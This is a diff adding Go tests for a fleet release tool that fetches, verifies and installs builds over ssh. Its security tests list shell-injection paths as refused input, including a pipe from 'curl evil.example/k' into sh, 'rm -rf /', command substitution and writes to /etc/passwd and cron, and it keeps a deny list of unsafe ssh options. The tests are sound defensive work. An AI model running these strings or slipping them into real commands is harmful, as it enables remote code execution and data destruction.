@@ -1,6 +1,7 @@
 package release
 
 import (
+	"archive/tar"
 	"bytes"
 	"context"
 	"crypto/sha256"
@@ -75,11 +76,15 @@ func (b *fakeToolchain) Build(_ context.Context, source, pkg, out, goos, goarch 
 }
 
 type fakeSSH struct {
-	runs  []string
-	sends []string
+	runs    []string
+	sends   []string
+	fetches []string
 	// answer is keyed by machine; a machine absent from it refuses.
 	answer map[string]string
 	refuse map[string]error
+	// serves is the local directory a machine hands back from a Fetch,
+	// standing in for `ssh host tar -cf -`.
+	serves map[string]string
 }
 
 func (s *fakeSSH) Run(_ context.Context, machine string, argv []string) (string, error) {
@@ -93,6 +98,40 @@ func (s *fakeSSH) Send(_ context.Context, machine, dir, dest string) (string, er
 	s.sends = append(s.sends, machine+": "+dir+" -> "+dest)
 	if err := s.refuse[machine]; err != nil {
 		return "", err
+	}
+	return "", nil
+}
+
+// Fetch stands in for `ssh host tar -cf - .` by copying the local directory the
+// test registered in serves, so a `--from host:dir` run exercises the staging,
+// the verification and the fan-out with no network and no tar binary.
+func (s *fakeSSH) Fetch(_ context.Context, machine, dir, dest string) (string, error) {
+	s.fetches = append(s.fetches, machine+": "+dir+" -> "+dest)
+	if err := s.refuse[machine]; err != nil {
+		return "", err
+	}
+	source, ok := s.serves[machine]
+	if !ok {
+		return "", fmt.Errorf("tar: %s: Cannot open: No such file or directory", dir)
+	}
+	if err := os.MkdirAll(dest, 0o755); err != nil {
+		return "", err
+	}
+	entries, err := os.ReadDir(source)
+	if err != nil {
+		return "", err
+	}
+	for _, e := range entries {
+		if e.IsDir() {
+			continue
+		}
+		body, err := os.ReadFile(filepath.Join(source, e.Name()))
+		if err != nil {
+			return "", err
+		}
+		if err := os.WriteFile(filepath.Join(dest, e.Name()), body, 0o755); err != nil {
+			return "", err
+		}
 	}
 	return "", nil
 }
@@ -867,5 +906,643 @@ func TestProgressGoesToStderrAndReceiptsToStdout(t *testing.T) {
 		if line != "" && !strings.HasPrefix(line, "RELEASE ") {
 			t.Fatalf("stdout carries something that is not a receipt: %q", line)
 		}
+	}
+}
+
+// ---------------------------------------------------------------------------
+// what the first fleet dogfood found (receipts, 2026-09-18, rowan-child)
+// ---------------------------------------------------------------------------
+
+// THE BLOCKER. adopt was written assuming it runs on the build host and fans
+// out; on this fleet it cannot, because no bench has ssh trust to any other
+// bench. 3 of 3 machines refused with `Permission denied (publickey)`. The fix
+// that needs no new trust is to run adopt where the trust already is and let it
+// READ the release from where it was built.
+func TestAdoptFetchesTheReleaseFromAnotherMachine(t *testing.T) {
+	goos, goarch := platformOf(t, "linux-amd64")
+	// hulk built it; this host has never seen the artifacts.
+	onHulk := built(t, "v0.16.0", "linux-amd64", "nova-bus", "nova-update")
+	stage := t.TempDir()
+	served := ArtifactDir(onHulk, "v0.16.0", goos, goarch)
+	// The digest the cut recorded, which reached this host through git.
+	digest, err := fileSum(filepath.Join(served, SumsFile))
+	if err != nil {
+		t.Fatal(err)
+	}
+	s := &fakeSSH{
+		serves: map[string]string{"hulk": served},
+		answer: map[string]string{
+			"vision": "RELEASE INSTALLED version=v0.16.0 tools=2 skipped=0 retired=0\n",
+			"mini":   "RELEASE INSTALLED version=v0.16.0 tools=2 skipped=0 retired=0\n",
+		},
+	}
+	var o, e bytes.Buffer
+	code := Run("nova-update", []string{"adopt", "--version", "v0.16.0",
+		"--machines", machinesFile(t, "vision\nmini\n"), "--ssh", "/usr/bin/ssh",
+		"--from", "hulk:/home/nova/nova-bench/release", "--stage", stage,
+		"--expect-sums", digest,
+		"--bin", "~/.local/bin", "--dest", "~/nova-bench/build",
+		"--platform", "linux-amd64"}, &o, &e, Deps{SSH: s})
+	if code != 0 {
+		t.Fatalf("code=%d errs=%s", code, e.String())
+	}
+	// ONE fetch, from the build host, and then a push to each machine: the
+	// machines never talk to each other and never need to.
+	if len(s.fetches) != 1 || !strings.Contains(s.fetches[0], "hulk: /home/nova/nova-bench/release/v0.16.0/linux-amd64") {
+		t.Fatalf("fetches=%v", s.fetches)
+	}
+	if len(s.sends) != 2 || len(s.runs) != 2 {
+		t.Fatalf("sends=%v runs=%v", s.sends, s.runs)
+	}
+	for _, machine := range []string{"vision", "mini"} {
+		if !strings.Contains(o.String(), "RELEASE ADOPTED machine="+machine+" version=v0.16.0") {
+			t.Fatalf("no receipt for %s:\n%s", machine, o.String())
+		}
+	}
+	// The staged copy is a real copy, verified here before any of it moved on.
+	if _, err := ReadSums(ArtifactDir(stage, "v0.16.0", goos, goarch)); err != nil {
+		t.Fatalf("the release was not staged: %v", err)
+	}
+	// A leading ~ survives to the remote shell, which is what lets one --bin
+	// name three different home directories.
+	if !strings.Contains(s.runs[0], "--bin ~/.local/bin") {
+		t.Fatalf("the tilde did not survive: %s", s.runs[0])
+	}
+}
+
+func TestAdoptRefusesARemoteFromWithNoStage(t *testing.T) {
+	var o, e bytes.Buffer
+	code := Run("nova-update", []string{"adopt", "--version", "v0.16.0",
+		"--machines", machinesFile(t, "vision\n"), "--ssh", "/usr/bin/ssh",
+		"--from", "hulk:/releases", "--bin", "/b", "--dest", "/d"}, &o, &e, Deps{SSH: &fakeSSH{}})
+	if code != 2 || !strings.Contains(e.String(), "--stage") {
+		t.Fatalf("code=%d errs=%s", code, e.String())
+	}
+}
+
+// A fetch that arrived truncated is caught ONCE, here, rather than four times
+// on four machines that are then in four different states.
+func TestAdoptRefusesAFetchThatDoesNotMatchItsChecksums(t *testing.T) {
+	goos, goarch := platformOf(t, "linux-amd64")
+	onHulk := built(t, "v0.16.0", "linux-amd64", "nova-bus", "nova-update")
+	dir := ArtifactDir(onHulk, "v0.16.0", goos, goarch)
+	if err := os.WriteFile(filepath.Join(dir, "nova-bus"), []byte("truncated"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	s := &fakeSSH{serves: map[string]string{"hulk": dir}}
+	// The checksum FILE is untouched, so its digest still matches what the cut
+	// recorded: this is the case where the bits alone were damaged in flight.
+	digest, err := fileSum(filepath.Join(dir, SumsFile))
+	if err != nil {
+		t.Fatal(err)
+	}
+	var o, e bytes.Buffer
+	code := Run("nova-update", []string{"adopt", "--version", "v0.16.0",
+		"--machines", machinesFile(t, "vision\n"), "--ssh", "/usr/bin/ssh",
+		"--from", "hulk:/releases", "--stage", t.TempDir(), "--expect-sums", digest,
+		"--bin", "/b", "--dest", "/d", "--platform", "linux-amd64"}, &o, &e, Deps{SSH: s})
+	if code != 2 || !strings.Contains(e.String(), "nova-bus") {
+		t.Fatalf("code=%d errs=%s", code, e.String())
+	}
+	if len(s.sends) != 0 {
+		t.Fatalf("a bad fetch was still pushed to a machine: %v", s.sends)
+	}
+}
+
+// A colon is ambiguous exactly once, and it is resolved in favour of the local
+// path: a windows artifact root is a path, not a host called C.
+func TestRemoteFromTellsAHostFromAWindowsPath(t *testing.T) {
+	for _, tc := range []struct {
+		in, host, dir string
+		remote        bool
+	}{
+		{"hulk:/home/nova/release", "hulk", "/home/nova/release", true},
+		{"nova@hulk:/releases", "nova@hulk", "/releases", true},
+		{`C:\releases`, "", `C:\releases`, false},
+		{"/home/nova/release", "", "/home/nova/release", false},
+		{"hulk:", "", "hulk:", false},
+	} {
+		host, dir, remote := RemoteFrom(tc.in)
+		if host != tc.host || dir != tc.dir || remote != tc.remote {
+			t.Errorf("%q -> (%q, %q, %v), want (%q, %q, %v)", tc.in, host, dir, remote, tc.host, tc.dir, tc.remote)
+		}
+	}
+}
+
+// The fleet has three home directories. A machine that is the odd one out says
+// so in the file, rather than in a second run with different flags -- which is
+// a second chance to get the version wrong.
+func TestMachinesFileCarriesPerMachineOverrides(t *testing.T) {
+	machines, err := Machines(strings.NewReader(
+		"# the fleet\nhulk\n\nvision\t~/bin\t~/stage\nnova@mini\t/opt/nova/bin\n"))
+	if err != nil {
+		t.Fatal(err)
+	}
+	want := []Machine{
+		{Name: "hulk"},
+		{Name: "vision", Bin: "~/bin", Dest: "~/stage"},
+		{Name: "nova@mini", Bin: "/opt/nova/bin"},
+	}
+	if fmt.Sprint(machines) != fmt.Sprint(want) {
+		t.Fatalf("got %v, want %v", machines, want)
+	}
+}
+
+func TestMachinesFileRefusesAShapeItCannotMean(t *testing.T) {
+	for _, tc := range []struct{ name, in, wants string }{
+		{"an empty override", "vision\t\n", "empty"},
+		{"a fourth column", "vision\t/b\t/d\t/x\n", "tab-separated fields"},
+		{"a name with a semicolon", "hulk; rm -rf /\n", "machine name"},
+		{"nothing at all", "# nobody\n\n", "no machine"},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			_, err := Machines(strings.NewReader(tc.in))
+			if err == nil || !strings.Contains(err.Error(), tc.wants) {
+				t.Fatalf("got %v, want a refusal naming %q", err, tc.wants)
+			}
+		})
+	}
+}
+
+func TestAdoptUsesEachMachinesOwnBinAndDest(t *testing.T) {
+	from := built(t, "v0.16.0", "linux-amd64", "nova-bus", "nova-update")
+	list := machinesFile(t, "hulk\nvision\t/opt/nova/bin\t/opt/nova/stage\n")
+	s := &fakeSSH{answer: map[string]string{
+		"hulk":   "RELEASE INSTALLED version=v0.16.0 tools=2 skipped=0 retired=0\n",
+		"vision": "RELEASE INSTALLED version=v0.16.0 tools=2 skipped=0 retired=0\n",
+	}}
+	var o, e bytes.Buffer
+	code := Run("nova-update", []string{"adopt", "--version", "v0.16.0", "--machines", list,
+		"--ssh", "/usr/bin/ssh", "--from", from, "--bin", "~/.local/bin",
+		"--dest", "~/nova-bench/build", "--platform", "linux-amd64"}, &o, &e, Deps{SSH: s})
+	if code != 0 {
+		t.Fatalf("code=%d errs=%s", code, e.String())
+	}
+	if !strings.Contains(s.runs[0], "--bin ~/.local/bin") || !strings.Contains(s.runs[0], "~/nova-bench/build") {
+		t.Fatalf("hulk did not get the flags' values: %s", s.runs[0])
+	}
+	if !strings.Contains(s.runs[1], "--bin /opt/nova/bin") || !strings.Contains(s.runs[1], "/opt/nova/stage") {
+		t.Fatalf("vision did not get its own columns: %s", s.runs[1])
+	}
+	// And the receipt says where the tools actually went on that machine.
+	if !strings.Contains(o.String(), "machine=vision version=v0.16.0 tools=2 skipped=0 retired=0 bin=/opt/nova/bin") {
+		t.Fatalf("the receipt does not carry that machine's bin:\n%s", o.String())
+	}
+}
+
+// After the first real adoption every bench held 18 stale ~/go/bin/nova-* from
+// a `go install` months ago -- both directories on PATH, and which one wins a
+// fact about PATH order nobody has read. The old shell script kept them in
+// step; the verb did not.
+func TestInstallRetiresStaleCopiesOfWhatItInstalled(t *testing.T) {
+	from := built(t, "v0.16.0", "", "nova-bus", "nova-swarm")
+	goos, _ := platformOf(t, "")
+	bin, goBin := t.TempDir(), t.TempDir()
+	// Two stale tools of ours, one tool of somebody else's, one directory.
+	for _, name := range []string{ToolFile("nova-bus", goos), ToolFile("nova-swarm", goos), "gopls"} {
+		if err := os.WriteFile(filepath.Join(goBin, name), []byte("stale"), 0o755); err != nil {
+			t.Fatal(err)
+		}
+	}
+	if err := os.MkdirAll(filepath.Join(goBin, "nova-keep-me"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	var o, e bytes.Buffer
+	code := Run("nova-update", []string{"install", "--from", from, "--version", "v0.16.0",
+		"--bin", bin, "--retire", goBin}, &o, &e,
+		Deps{VersionOf: func(context.Context, string) (string, error) { return "", fmt.Errorf("absent") }})
+	if code != 0 {
+		t.Fatalf("code=%d errs=%s", code, e.String())
+	}
+	if !strings.Contains(o.String(), "tools=2 skipped=0 retired=2") {
+		t.Fatalf("the receipt does not count the retirement:\n%s", o.String())
+	}
+	for _, name := range []string{ToolFile("nova-bus", goos), ToolFile("nova-swarm", goos)} {
+		if _, err := os.Stat(filepath.Join(goBin, name)); !os.IsNotExist(err) {
+			t.Fatalf("%s was not retired: %v", name, err)
+		}
+	}
+	// NARROW: only a name this run installed, only a regular file. Somebody
+	// else's tool and a directory that happens to be called nova-* stay.
+	if _, err := os.Stat(filepath.Join(goBin, "gopls")); err != nil {
+		t.Fatalf("a tool that is not ours was removed: %v", err)
+	}
+	if _, err := os.Stat(filepath.Join(goBin, "nova-keep-me")); err != nil {
+		t.Fatalf("a directory was removed: %v", err)
+	}
+	// And what was installed is untouched.
+	assertRunnable(t, filepath.Join(bin, ToolFile("nova-bus", goos)))
+}
+
+// The one argument that would delete the release just installed.
+func TestInstallRefusesToRetireTheDirectoryItInstalledInto(t *testing.T) {
+	from := built(t, "v0.16.0", "", "nova-bus")
+	bin := t.TempDir()
+	var o, e bytes.Buffer
+	code := Run("nova-update", []string{"install", "--from", from, "--version", "v0.16.0",
+		"--bin", bin, "--retire", bin}, &o, &e,
+		Deps{VersionOf: func(context.Context, string) (string, error) { return "", fmt.Errorf("absent") }})
+	if code != 2 || !strings.Contains(e.String(), "--retire") {
+		t.Fatalf("code=%d errs=%s", code, e.String())
+	}
+	goos, _ := platformOf(t, "")
+	assertRunnable(t, filepath.Join(bin, ToolFile("nova-bus", goos)))
+}
+
+func TestInstallWithNoRetireDirectoryIsNotAFailure(t *testing.T) {
+	from := built(t, "v0.16.0", "", "nova-bus")
+	var o, e bytes.Buffer
+	code := Run("nova-update", []string{"install", "--from", from, "--version", "v0.16.0",
+		"--bin", t.TempDir(), "--retire", filepath.Join(t.TempDir(), "no-go-bin-here")}, &o, &e,
+		Deps{VersionOf: func(context.Context, string) (string, error) { return "", fmt.Errorf("absent") }})
+	if code != 0 || !strings.Contains(o.String(), "retired=0") {
+		t.Fatalf("code=%d out=%s errs=%s", code, o.String(), e.String())
+	}
+}
+
+func TestAdoptPassesRetireToEachMachineAndCountsIt(t *testing.T) {
+	from := built(t, "v0.16.0", "linux-amd64", "nova-bus", "nova-update")
+	s := &fakeSSH{answer: map[string]string{
+		"hulk": "RELEASE INSTALLED version=v0.16.0 tools=2 skipped=0 retired=18\n",
+	}}
+	var o, e bytes.Buffer
+	code := Run("nova-update", []string{"adopt", "--version", "v0.16.0",
+		"--machines", machinesFile(t, "hulk\n"), "--ssh", "/usr/bin/ssh", "--from", from,
+		"--bin", "~/.local/bin", "--dest", "~/build", "--retire", "~/go/bin",
+		"--platform", "linux-amd64"}, &o, &e, Deps{SSH: s})
+	if code != 0 {
+		t.Fatalf("code=%d errs=%s", code, e.String())
+	}
+	if !strings.Contains(s.runs[0], "--retire ~/go/bin") {
+		t.Fatalf("the remote install was not told to retire: %s", s.runs[0])
+	}
+	if !strings.Contains(o.String(), "retired=18") {
+		t.Fatalf("the receipt does not carry the retirement:\n%s", o.String())
+	}
+}
+
+// The help is the banner, and these are the two things a person cannot work out
+// from the flag names alone.
+func TestReleaseHelpCarriesTheMachinesFormatAndTheAdoptRule(t *testing.T) {
+	var o, e bytes.Buffer
+	if code := Run("nova-update", []string{"help"}, &o, &e, Deps{}); code != 0 {
+		t.Fatal(code)
+	}
+	for _, s := range []string{"one machine per line", "TAB", "user@host", "expands a leading ~", "host:dir", "--retire"} {
+		if !strings.Contains(o.String(), s) {
+			t.Errorf("the help does not carry %q:\n%s", s, o.String())
+		}
+	}
+}
+
+// ---------------------------------------------------------------------------
+// Johnny's security read of adopt (2026-09-18). One test per "never".
+// ---------------------------------------------------------------------------
+
+// NEVER interpolate an unvalidated host or path into a command the far side's
+// shell will parse. adopt composes `mkdir -p <dest> && tar -C <dest> -xf -`,
+// so a path carrying shell syntax would not be a path, it would be a command.
+// Every one of these is refused BEFORE any remote command is composed, which is
+// why the assertion is that ssh was never reached at all.
+func TestAdoptRefusesAPathTheRemoteShellWouldReadAsSyntax(t *testing.T) {
+	from := built(t, "v0.16.0", "linux-amd64", "nova-bus", "nova-update")
+	hostile := []string{
+		"/tmp/x; rm -rf /",
+		"/tmp/x && curl evil.example/k | sh",
+		"/tmp/$(id)",
+		"/tmp/`id`",
+		"/tmp/x|tee /etc/passwd",
+		"/tmp/x\nrm -rf /",
+		"/tmp/'x'",
+		"/tmp/x>/etc/cron.d/x",
+		"relative/path",
+		"~/../../etc",
+		"$HOME/bin",
+	}
+	for _, flag := range []string{"--bin", "--dest", "--retire"} {
+		for _, bad := range hostile {
+			t.Run(flag+" "+bad, func(t *testing.T) {
+				args := []string{"adopt", "--version", "v0.16.0",
+					"--machines", machinesFile(t, "hulk\n"), "--ssh", "/usr/bin/ssh",
+					"--from", from, "--bin", "~/.local/bin", "--dest", "~/build",
+					"--platform", "linux-amd64"}
+				// Replace the flag under test with the hostile value.
+				for i := range args {
+					if args[i] == flag {
+						args[i+1] = bad
+					}
+				}
+				if flag == "--retire" {
+					args = append(args, "--retire", bad)
+				}
+				s := &fakeSSH{answer: map[string]string{"hulk": "RELEASE INSTALLED version=v0.16.0 tools=2 skipped=0 retired=0\n"}}
+				var o, e bytes.Buffer
+				code := Run("nova-update", args, &o, &e, Deps{SSH: s})
+				if code != 2 {
+					t.Fatalf("%s %q was accepted: code=%d out=%s", flag, bad, code, o.String())
+				}
+				if len(s.runs)+len(s.sends)+len(s.fetches) != 0 {
+					t.Fatalf("%s %q reached ssh: runs=%v sends=%v", flag, bad, s.runs, s.sends)
+				}
+			})
+		}
+	}
+}
+
+// The same rule for a path that arrives in the machines file rather than on the
+// command line: the columns are interpolated into the same remote command.
+func TestAdoptRefusesAHostilePathInTheMachinesFile(t *testing.T) {
+	from := built(t, "v0.16.0", "linux-amd64", "nova-bus", "nova-update")
+	s := &fakeSSH{}
+	var o, e bytes.Buffer
+	code := Run("nova-update", []string{"adopt", "--version", "v0.16.0",
+		"--machines", machinesFile(t, "hulk\nvision\t/opt/x; rm -rf /\n"), "--ssh", "/usr/bin/ssh",
+		"--from", from, "--bin", "~/.local/bin", "--dest", "~/build",
+		"--platform", "linux-amd64"}, &o, &e, Deps{SSH: s})
+	if code != 2 || !strings.Contains(e.String(), "vision") {
+		t.Fatalf("code=%d errs=%s", code, e.String())
+	}
+	// Not even the FIRST machine was touched: the whole file is validated
+	// before any of it is acted on, so a bad line does not leave half a fleet
+	// adopted and half refused.
+	if len(s.runs)+len(s.sends) != 0 {
+		t.Fatalf("a hostile column still reached ssh: %v %v", s.runs, s.sends)
+	}
+}
+
+func TestValidRemotePathTakesWhatItShould(t *testing.T) {
+	for _, good := range []string{"/home/nova/.local/bin", "~/.local/bin", "/opt/nova-tools/bin", "~/go/bin", "/a+b/c-d_e.f@g"} {
+		if err := ValidRemotePath("--bin", good); err != nil {
+			t.Errorf("refused %q: %v", good, err)
+		}
+	}
+}
+
+// NEVER forward the agent, and never put a key on argv. This verb runs on the
+// one host that holds keys to the whole fleet; forwarding that agent to a bench
+// would put the fleet's trust inside a machine the release is being pushed TO,
+// and a key named on argv is a key in every `ps` on the box.
+func TestSSHOptionsForbidAgentForwardingAndKeysOnArgv(t *testing.T) {
+	joined := strings.Join(SSHOptions, " ")
+	if !strings.Contains(joined, "ForwardAgent=no") {
+		t.Fatalf("ForwardAgent=no is not said out loud: %s", joined)
+	}
+	if !strings.Contains(joined, "BatchMode=yes") {
+		t.Fatalf("BatchMode=yes is missing: %s", joined)
+	}
+	for _, never := range []string{"ForwardAgent=yes", "-i ", "IdentityFile", "-A", "StrictHostKeyChecking=no", "Password"} {
+		if strings.Contains(joined, never) {
+			t.Fatalf("the ssh options carry %q: %s", never, joined)
+		}
+	}
+	// And the whole composed argv for a real machine carries none of them.
+	argv := ExecSSH{Path: "/usr/bin/ssh"}.sshArgs("hulk")
+	if argv[len(argv)-1] != "hulk" {
+		t.Fatalf("the machine is not the last argument: %v", argv)
+	}
+	for _, a := range argv {
+		if a == "-i" || a == "-A" || strings.HasSuffix(a, ".key") || strings.HasSuffix(a, ".pem") {
+			t.Fatalf("a key or an agent flag reached argv: %v", argv)
+		}
+	}
+}
+
+// NEVER let a release fetched from a machine be verified by the checksum file
+// that came with it: anybody who could change one could change the other. The
+// digest comes from the cut, through git, and a mismatch names BOTH -- which
+// one is wrong is the whole question.
+func TestAdoptRefusesAFetchedReleaseWhoseSumsAreNotTheOnesCut(t *testing.T) {
+	goos, goarch := platformOf(t, "linux-amd64")
+	onHulk := built(t, "v0.16.0", "linux-amd64", "nova-bus", "nova-update")
+	dir := ArtifactDir(onHulk, "v0.16.0", goos, goarch)
+	s := &fakeSSH{serves: map[string]string{"hulk": dir}}
+	// A digest of something else entirely: what the cut recorded.
+	cutDigest := strings.Repeat("ab", 32)
+	var o, e bytes.Buffer
+	code := Run("nova-update", []string{"adopt", "--version", "v0.16.0",
+		"--machines", machinesFile(t, "vision\n"), "--ssh", "/usr/bin/ssh",
+		"--from", "hulk:/releases", "--stage", t.TempDir(), "--expect-sums", cutDigest,
+		"--bin", "~/.local/bin", "--dest", "~/build", "--platform", "linux-amd64"}, &o, &e, Deps{SSH: s})
+	if code != 2 {
+		t.Fatalf("a substituted release was adopted: code=%d out=%s", code, o.String())
+	}
+	if !strings.Contains(e.String(), cutDigest) {
+		t.Fatalf("the refusal does not name the digest the release was cut with: %s", e.String())
+	}
+	if !strings.Contains(e.String(), "was cut with") || strings.Count(e.String(), "digest") < 2 {
+		t.Fatalf("the refusal does not name both digests: %s", e.String())
+	}
+	if len(s.sends) != 0 {
+		t.Fatalf("a release that failed the digest was still pushed: %v", s.sends)
+	}
+}
+
+func TestAdoptRefusesARemoteFromWithNoDigestToCheckAgainst(t *testing.T) {
+	from := built(t, "v0.16.0", "linux-amd64", "nova-bus", "nova-update")
+	s := &fakeSSH{serves: map[string]string{"hulk": ArtifactDir(from, "v0.16.0", "linux", "amd64")}}
+	var o, e bytes.Buffer
+	code := Run("nova-update", []string{"adopt", "--version", "v0.16.0",
+		"--machines", machinesFile(t, "vision\n"), "--ssh", "/usr/bin/ssh",
+		"--from", "hulk:/releases", "--stage", t.TempDir(),
+		"--bin", "~/.local/bin", "--dest", "~/build", "--platform", "linux-amd64"}, &o, &e, Deps{SSH: s})
+	if code != 2 || !strings.Contains(e.String(), "--expect-sums") {
+		t.Fatalf("code=%d errs=%s", code, e.String())
+	}
+	if len(s.fetches) != 0 {
+		t.Fatalf("a release was fetched with nothing to check it against: %v", s.fetches)
+	}
+}
+
+// The digest the cut records and the digest adopt checks are the same string,
+// written in the form the flag wants so nobody has to transcribe it.
+func TestCutRecordsTheSumsDigestTheAdoptWillCheck(t *testing.T) {
+	goos, goarch := platformOf(t, "linux-amd64")
+	out := built(t, "v0.16.0", "linux-amd64", "nova-bus", "nova-update")
+	sums := filepath.Join(ArtifactDir(out, "v0.16.0", goos, goarch), SumsFile)
+	want, err := fileSum(sums)
+	if err != nil {
+		t.Fatal(err)
+	}
+	path := filepath.Join(t.TempDir(), "CHANGELOG.md")
+	var o, e bytes.Buffer
+	code := Run("nova-update", []string{"cut", "--repo", "o/n", "--from", "main",
+		"--version", "v0.16.0", "--changelog", path, "--sums", sums}, &o, &e, cutDeps(t, cutForge()))
+	if code != 0 {
+		t.Fatalf("code=%d errs=%s", code, e.String())
+	}
+	body, err := os.ReadFile(path)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if !strings.Contains(string(body), SumsDigestPrefix+want) {
+		t.Fatalf("the section does not record the digest %s:\n%s", want, body)
+	}
+	if !strings.Contains(string(body), "--expect-sums "+want) {
+		t.Fatalf("the section does not say how to use it:\n%s", body)
+	}
+	if !strings.Contains(o.String(), "sums="+want) {
+		t.Fatalf("the cut line does not carry the digest: %s", o.String())
+	}
+	// And that digest is exactly what adopt accepts for the same artifacts.
+	s := &fakeSSH{
+		serves: map[string]string{"hulk": ArtifactDir(out, "v0.16.0", goos, goarch)},
+		answer: map[string]string{"vision": "RELEASE INSTALLED version=v0.16.0 tools=2 skipped=0 retired=0\n"},
+	}
+	o.Reset()
+	e.Reset()
+	if code := Run("nova-update", []string{"adopt", "--version", "v0.16.0",
+		"--machines", machinesFile(t, "vision\n"), "--ssh", "/usr/bin/ssh",
+		"--from", "hulk:/releases", "--stage", t.TempDir(), "--expect-sums", want,
+		"--bin", "~/.local/bin", "--dest", "~/build", "--platform", "linux-amd64"},
+		&o, &e, Deps{SSH: s}); code != 0 {
+		t.Fatalf("the digest the cut wrote was not accepted: %d %s", code, e.String())
+	}
+}
+
+// NEVER install before the checksum. The order is asserted by watching what the
+// verb touched: a release whose bytes changed reaches neither the version probe
+// nor a rename.
+func TestInstallChecksBeforeItTouchesAnything(t *testing.T) {
+	from := built(t, "v0.16.0", "", "nova-bus", "nova-swarm")
+	goos, _ := platformOf(t, "")
+	dir := ArtifactDir(from, "v0.16.0", goos, "")
+	dir = filepath.Dir(dir)
+	entries, err := os.ReadDir(dir)
+	if err != nil {
+		t.Fatal(err)
+	}
+	platDir := filepath.Join(dir, entries[0].Name())
+	if err := os.WriteFile(filepath.Join(platDir, ToolFile("nova-bus", goos)), []byte("swapped"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	bin := t.TempDir()
+	probed := 0
+	var o, e bytes.Buffer
+	code := Run("nova-update", []string{"install", "--from", from, "--version", "v0.16.0", "--bin", bin},
+		&o, &e, Deps{VersionOf: func(context.Context, string) (string, error) {
+			probed++
+			return "", fmt.Errorf("absent")
+		}})
+	if code != 2 {
+		t.Fatalf("code=%d", code)
+	}
+	if probed != 0 {
+		t.Fatalf("the version probe ran %d times before the checksum was checked", probed)
+	}
+	if entries, err := os.ReadDir(bin); err != nil || len(entries) != 0 {
+		t.Fatalf("something was written before the checksum passed: %v %v", entries, err)
+	}
+}
+
+// NEVER remove the last-good stamp. --from's artifact directory is what a
+// re-install and a rollback read, and what adopt just verified.
+func TestRetireRefusesTheLiveStamp(t *testing.T) {
+	from := built(t, "v0.16.0", "", "nova-bus")
+	goos, goarch := platformOf(t, "")
+	for _, target := range []string{from, ArtifactDir(from, "v0.16.0", goos, goarch)} {
+		var o, e bytes.Buffer
+		code := Run("nova-update", []string{"install", "--from", from, "--version", "v0.16.0",
+			"--bin", t.TempDir(), "--retire", target}, &o, &e,
+			Deps{VersionOf: func(context.Context, string) (string, error) { return "", fmt.Errorf("absent") }})
+		if code != 2 || !strings.Contains(e.String(), "stamp") {
+			t.Fatalf("--retire %s: code=%d errs=%s", target, code, e.String())
+		}
+		// The stamp is still whole: a refused retire removed nothing.
+		if _, err := ReadSums(ArtifactDir(from, "v0.16.0", goos, goarch)); err != nil {
+			t.Fatalf("the stamp was damaged by a refused retire: %v", err)
+		}
+	}
+}
+
+// NEVER copy whatever happens to be in the directory. The shipped set is the
+// verified set: a key or a token dropped beside the binaries must not be
+// couriered to every machine in the fleet by a verb nobody thinks of as a file
+// transfer.
+func TestSendCarriesOnlyWhatTheChecksumFileNames(t *testing.T) {
+	goos, goarch := platformOf(t, "")
+	from := built(t, "v0.16.0", "", "nova-bus", "nova-update")
+	dir := ArtifactDir(from, "v0.16.0", goos, goarch)
+	for _, stray := range []string{"deploy.key", "notes.txt", ".env"} {
+		if err := os.WriteFile(filepath.Join(dir, stray), []byte("secret"), 0o600); err != nil {
+			t.Fatal(err)
+		}
+	}
+	var buf bytes.Buffer
+	arts, err := ReadSums(dir)
+	if err != nil {
+		t.Fatal(err)
+	}
+	allowed := map[string]bool{SumsFile: true}
+	for _, a := range arts {
+		allowed[a.Name] = true
+	}
+	if err := writeTar(&buf, dir, "linux-amd64", allowed); err != nil {
+		t.Fatal(err)
+	}
+	sent := map[string]bool{}
+	tr := tar.NewReader(&buf)
+	for {
+		h, err := tr.Next()
+		if err != nil {
+			break
+		}
+		sent[filepath.Base(h.Name)] = true
+	}
+	for _, stray := range []string{"deploy.key", "notes.txt", ".env"} {
+		if sent[stray] {
+			t.Fatalf("%s was sent to the machine; the tar carried %v", stray, sent)
+		}
+	}
+	for _, a := range arts {
+		if !sent[a.Name] {
+			t.Fatalf("%s was not sent; the tar carried %v", a.Name, sent)
+		}
+	}
+	if !sent[SumsFile] {
+		t.Fatalf("the checksum file was not sent: %v", sent)
+	}
+}
+
+// NEVER eval what the far side said. The receipt is matched by a regexp and
+// nothing else, so a remote answering with shell syntax is a machine that gets
+// refused, not a command that runs here.
+func TestAdoptTreatsRemoteOutputAsDataNotAsACommand(t *testing.T) {
+	from := built(t, "v0.16.0", "linux-amd64", "nova-bus", "nova-update")
+	marker := filepath.Join(t.TempDir(), "should-not-exist")
+	s := &fakeSSH{answer: map[string]string{
+		"hulk": "$(touch " + marker + ")\n`touch " + marker + "`\n; touch " + marker + "\n",
+	}}
+	var o, e bytes.Buffer
+	code := Run("nova-update", []string{"adopt", "--version", "v0.16.0",
+		"--machines", machinesFile(t, "hulk\n"), "--ssh", "/usr/bin/ssh", "--from", from,
+		"--bin", "~/.local/bin", "--dest", "~/build", "--platform", "linux-amd64"}, &o, &e, Deps{SSH: s})
+	if code != 1 || !strings.Contains(e.String(), "RELEASE REFUSED machine=hulk") {
+		t.Fatalf("code=%d errs=%s", code, e.String())
+	}
+	if _, err := os.Stat(marker); !os.IsNotExist(err) {
+		t.Fatalf("the remote's output was executed: %v", err)
+	}
+}
+
+// The far-side binary is named by ABSOLUTE path, never by $PATH: it must be the
+// one just sent and verified, not whichever nova-update the bench's PATH finds.
+func TestAdoptRunsTheBinaryItSentByAbsolutePath(t *testing.T) {
+	from := built(t, "v0.16.0", "linux-amd64", "nova-bus", "nova-update")
+	s := &fakeSSH{answer: map[string]string{"hulk": "RELEASE INSTALLED version=v0.16.0 tools=2 skipped=0 retired=0\n"}}
+	var o, e bytes.Buffer
+	if code := Run("nova-update", []string{"adopt", "--version", "v0.16.0",
+		"--machines", machinesFile(t, "hulk\n"), "--ssh", "/usr/bin/ssh", "--from", from,
+		"--bin", "~/.local/bin", "--dest", "~/nova-bench/build", "--platform", "linux-amd64"},
+		&o, &e, Deps{SSH: s}); code != 0 {
+		t.Fatalf("code=%d errs=%s", code, e.String())
+	}
+	run := s.runs[0]
+	command := strings.TrimPrefix(run, "hulk: ")
+	first := strings.Fields(command)[0]
